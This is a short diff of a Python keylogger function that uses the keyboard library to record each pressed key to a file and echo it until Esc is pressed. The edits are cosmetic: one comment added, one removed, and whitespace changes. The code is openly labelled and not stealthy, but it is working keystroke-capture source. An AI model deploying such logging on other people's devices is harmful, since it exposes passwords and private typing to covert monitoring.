@@ -5,14 +5,15 @@ def log_keys(filename):
         with open(filename, 'a') as f:
             print(f"Logging keystrokes to {filename}")
             while True:
+                # Check if a key is pressed
                 event = keyboard.read_event()
                 if event.event_type == keyboard.KEY_DOWN:
                     key = event.name
-                    if key == "esc":
+                    if key == "esc":  
                         print("Exiting keylogger")
                         break
                     f.write(key + "\n")
-                    f.flush()  # Ensure the keystroke is written to the file immediately
+                    f.flush() 
                     print(key)
     except Exception as e:
         print(f"An error occurred: {e}")
